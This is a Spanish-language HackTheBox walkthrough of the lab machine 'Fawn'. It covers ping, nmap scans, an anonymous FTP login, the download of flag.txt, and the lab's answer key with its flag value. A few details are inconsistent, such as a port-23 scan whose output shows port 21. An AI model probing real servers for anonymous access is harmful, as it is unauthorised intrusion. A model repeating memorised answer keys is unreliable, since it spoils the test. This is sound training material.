---
Titulo: Fawn
Plataforma: HackTheBox
Laboratorio: Starting Point Tier 0
Dificultad: Very Easy
os: Linux
ip: 10.129.1.14
Fecha: 21-09-2026
tags:
  - "#very-easy"
  - Starting-Point
  - Tier0
  - HTB-Labs
---

<div align="center">
  <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/9e4d90d2-2466-45d9-84c2-40ce19af2c77.png" alt="Avatar">
</div>


# 🖥️ Máquina Fawn
`Fawn` es una máquina Linux muy fácil (`very easy`) que guía a los jugadores a conectarse a los laboratorios de HTB a través de VPN y demostrar las habilidades básicas para resolver una máquina. Se centra en analizar el Protocolo de Transferencia de Archivos (FTP) y cómo puede ser aprovechado cuando está mal configurado, permitiendo acceso anónimo.

## Conectividad
Antes de escanear puertos, verificamos que la máquina objetivo esté activa y accesible en la red mediante una solicitud de eco ICMP (`ping`). Este paso es importante porque confirma la conectividad real con el objetivo antes de invertir tiempo en un escaneo más pesado, y de paso entrega información gratuita, una de ellas es el valor de `TTL`, el cual es una pista temprana del SO. Linux suele iniciar en `64`, Windows en `128`; si el valor llega decrementado (ej. 63 o 127), indica cuántos saltos/routers cruzó el paquete en el camino,

```bash title:"Ping - Verificación de Conectivdad"
ping -c 1 10.129.1.14
```

```bash
PING 10.129.1.14 (10.129.1.14) 56(84) bytes of data.
64 bytes from 10.129.1.14: icmp_seq=1 ttl=63 time=7.19 ms

--- 10.129.1.14 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 7.191/7.191/7.191/0.000 ms
```
## Reconocimiento

```bash title="Nmap - Descubrimiento de puertos"
sudo nmap -p- --open -sS --min-rate 5000 -vvv 10.129.1.14 -oN allPorts
```

```bash
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
```

```bash title="Nmap - Escaneo dirigido"
sudo nmap -p23 -sCV -vvv 10.129.1.14 -oN targeted
```

```bash
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.15.239
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 5
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
Service Info: OS: Unix
```

El escaneo dirigido confirma un único puerto abierto: **21/tcp (FTP)**, corriendo `vsftpd 3.0.3` sobre un sistema Unix. El script `ftp-anon` de Nmap confirma que el servidor permite **login anónimo** (código FTP 230), una mala configuración común (CWE-284: Improper Access Control) que expone el contenido del servidor sin necesidad de credenciales.

De hecho, el mismo escaneo ya lista el archivo `flag.txt` en la raíz del servidor (`-rw-r--r-- 1 0 0 32 Jun 04 2021 flag.txt`), propiedad de UID 0 (root). El script `ftp-syst` confirma además que tanto el canal de control como el de datos viajan en texto plano, por lo que cualquier credencial usada sobre este servicio también sería interceptable.

Esto reduce la fase de enumeración a un simple login anónimo para confirmar el hallazgo y extraer el archivo.

## Enumeración
El propio escaneo de `Nmap` ya confirmó que el servidor permite **login anónimo**. Por lo que se reduce a confirmar manualmente ese acceso y explorar el contenido disponible, en vez de un proceso de prueba y error.

```bash title="FTP - Conexión con Usuario anonymous"
ftp 10.129.1.14 
Connected to 10.129.1.14.
220 (vsFTPd 3.0.3)
Name (10.129.1.14:root): 
```

```bash
# Prueba usuario anonymous
ftp login: anonymous
331 Please specify the password.
Password: 
```

```bash title:"Telnet - Conexión successfull"
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

## Explotación
La vulnerabilidad explotada es una **autenticación insuficiente por cuenta anonymous habilitada** (CWE-287: Improper Authentication), expuesta directamente a través de un servicio FTP sin cifrado. A diferencia de una sesión con shell interactiva, FTP no otorga ejecución de comandos en el sistema, sin embargo el acceso obtenido es a nivel de sistema de archivos remoto, limitado a las operaciones que el protocolo permite (listar, descargar, subir según permisos).

Como se mostró en la fase de enumeración, el login con usuario `anonymous` otorgó acceso de lectura al servidor sin validación real de identidad. Se verifica el nivel de acceso obtenido:
```bash title="Verificación de Acceso Obtenido"
fpt> ls -la
```

```bash
150 Here comes the directory listing.
drwxr-xr-x    2 0        121          4096 Jun 04  2021 .
drwxr-xr-x    2 0        121          4096 Jun 04  2021 ..
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
```
El acceso obtenido permite listar y descargar archivos como usuario anónimo, sin credenciales válidas, confirmando el hallazgo detectado en el reconocimiento.

## Post-Explotación
Con acceso de lectura confirmado, se descarga el archivo `flag.txt` localmente para extraer su contenido.

```bash title:"FTP - Descarga del archivo flag.txt"
ftp> get flag.txt

100% |********************************************|    32       43.52 KiB/s    00:00 ETA
226 Transfer complete.
```

```bash title:"Lectura de la Flag.txt descargada"
035db21c881520061c53e0536e44f815
```
<br>
<details>
<summary>📎 Preguntas guiadas (Starting Point)</summary>
<br>

<table>
<tr><td><b>1.</b></td><td>¿Qué significa la sigla de 3 letras <code>FTP</code>?</td><td><code>File Transfer Protocol</code></td></tr>
<tr><td><b>2.</b></td><td>¿En qué puerto escucha habitualmente el servicio FTP?</td><td><code>21</code></td></tr>
<tr><td><b>3.</b></td><td>FTP envía datos en texto plano, sin cifrado. ¿Qué sigla se usa para un protocolo posterior diseñado para ofrecer una funcionalidad similar a FTP pero de forma segura, como extensión del protocolo SSH?</td><td><code>SFTP</code></td></tr>
<tr><td><b>4.</b></td><td>¿Qué comando podemos usar para enviar una solicitud de eco ICMP y probar la conexión con el objetivo?</td><td><code>ping</code></td></tr>
<tr><td><b>5.</b></td><td>Según tus escaneos, ¿qué versión de FTP corre en el objetivo?</td><td><code>vsftpd 3.0.3</code></td></tr>
<tr><td><b>6.</b></td><td>Según tus escaneos, ¿qué tipo de sistema operativo corre en el objetivo?</td><td><code>Unix</code></td></tr>
<tr><td><b>7.</b></td><td>¿Qué comando necesitamos ejecutar para mostrar el menú de ayuda del cliente <code>ftp</code>?</td><td><code>ftp -?</code></td></tr>
<tr><td><b>8.</b></td><td>¿Qué nombre de usuario se utiliza en FTP para iniciar sesión sin tener una cuenta?</td><td><code>anonymous</code></td></tr>
<tr><td><b>9.</b></td><td>¿Cuál es el código de respuesta que obtenemos para el mensaje FTP <i>"Login successful"</i>?</td><td><code>230</code></td></tr>
<tr><td><b>10.</b></td><td>Hay un par de comandos para listar los archivos y directorios disponibles en el servidor FTP. Uno es <code>dir</code>. ¿Cuál es el otro, forma común de listar archivos en un sistema Linux?</td><td><code>ls</code></td></tr>
<tr><td><b>11.</b></td><td>¿Cuál es el comando usado para descargar el archivo encontrado en el servidor FTP?</td><td><code>get</code></td></tr>
<tr><td colspan="2"><b>Desafío:</b> Envía la flag encontrada en el servidor FTP</td><td><code>035db21c881520061c53e0536e44f815</code></td></tr>
</table>

</details>
<br>

<h2>🧠 Lo que aprendí resolviendo la máquina</h2>
sss

<h3>🚩 Flags</h3>

| Flag     | Ruta             | Valor                              |
| -------- | ---------------- | ---------------------------------- |
| flag.txt | `flag.txt` | `035db21c881520061c53e0536e44f815` |

